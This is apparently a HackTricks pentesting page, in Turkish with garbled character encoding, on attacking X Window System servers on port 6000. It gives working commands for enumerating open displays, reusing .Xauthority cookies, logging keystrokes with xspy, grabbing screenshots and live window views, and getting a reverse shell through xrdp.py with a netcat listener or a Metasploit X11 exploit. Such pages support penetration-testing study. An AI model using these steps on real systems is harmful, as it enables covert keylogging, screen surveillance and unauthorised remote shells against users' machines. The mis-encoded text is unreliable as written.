# 6000 - Pentesting X11

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**BugÃ¼n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) Ã¼zerinden bize katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Temel Bilgiler

**X Window System** (X), UNIX tabanlÄ± iÅŸletim sistemlerinde yaygÄ±n olan Ã§ok yÃ¶nlÃ¼ bir pencereleme sistemidir. Grafiksel **kullanÄ±cÄ± arayÃ¼zleri (GUI'ler)** oluÅŸturmak iÃ§in bir Ã§erÃ§eve saÄŸlar; bireysel programlar kullanÄ±cÄ± arayÃ¼zÃ¼ tasarÄ±mÄ±nÄ± yÃ¶netir. Bu esneklik, X ortamÄ±nda Ã§eÅŸitli ve Ã¶zelleÅŸtirilebilir deneyimlere olanak tanÄ±r.

**VarsayÄ±lan port:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Enumeration

**Anonim baÄŸlantÄ±yÄ± kontrol et:**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### Yerel SayÄ±m

KullanÄ±cÄ±larÄ±n ana dizinindeki **`.Xauthority`** dosyasÄ±, **X11 tarafÄ±ndan yetkilendirme iÃ§in kullanÄ±lÄ±r**. [**buradan**](https://stackoverflow.com/a/37367518):
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: 128bit anahtar (â€œcookieâ€) oluÅŸturma, bunu \~/.Xauthority (veya XAUTHORITY envvar'Ä±n iÅŸaret ettiÄŸi yere) kaydetme. Ä°stemci bunu sunucuya dÃ¼z metin olarak gÃ¶nderir! Sunucu bu â€œcookieâ€nin bir kopyasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol eder ve eÄŸer varsa, baÄŸlantÄ±ya izin verilir. Anahtar DMX tarafÄ±ndan oluÅŸturulur.

{% hint style="warning" %}
**Cookie'yi kullanmak iÃ§in** env var'Ä± ayarlamalÄ±sÄ±nÄ±z: **`export XAUTHORITY=/path/to/.Xauthority`**
{% endhint %}

#### Yerel SÄ±ralama Oturumu
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
Ã–rnekte, `localhost:0` xfce4-session Ã§alÄ±ÅŸÄ±yordu.

## BaÄŸlantÄ±yÄ± DoÄŸrula
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keyloggin

[xspy](http://tools.kali.org/sniffingspoofing/xspy) klavye tuÅŸ vuruÅŸlarÄ±nÄ± dinlemek iÃ§in kullanÄ±lÄ±r.

Sample Output:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ yakalama
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Uzak MasaÃ¼stÃ¼ GÃ¶rÃ¼nÃ¼mÃ¼

Way from: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Way from: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

Ã–ncelikle xwininfo kullanarak pencerenin ID'sini bulmamÄ±z gerekiyor.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

**canlÄ± gÃ¶rÃ¼ntÃ¼leme** iÃ§in kullanmamÄ±z gerekiyor
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Shell Elde Etme
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
DiÄŸer yol:

**Reverse Shell:** Xrdp ayrÄ±ca Netcat aracÄ±lÄ±ÄŸÄ±yla ters shell almayÄ± da saÄŸlar. AÅŸaÄŸÄ±daki komutu yazÄ±n:
```bash
./xrdp.py \<IP:0> â€“no-disp
```
ArayÃ¼zde **R-shell seÃ§eneÄŸini** gÃ¶rebilirsiniz.

Sonra, yerel sisteminizde 5555 numaralÄ± portta bir **Netcat dinleyicisi** baÅŸlatÄ±n.
```bash
nc -lvp 5555
```
Sonra, IP adresinizi ve portunuzu **R-Shell** seÃ§eneÄŸine koyun ve bir shell almak iÃ§in **R-shell**'e tÄ±klayÄ±n.

## Referanslar

* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**BugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmak iÃ§in** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 'a katÄ±lÄ±n!

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
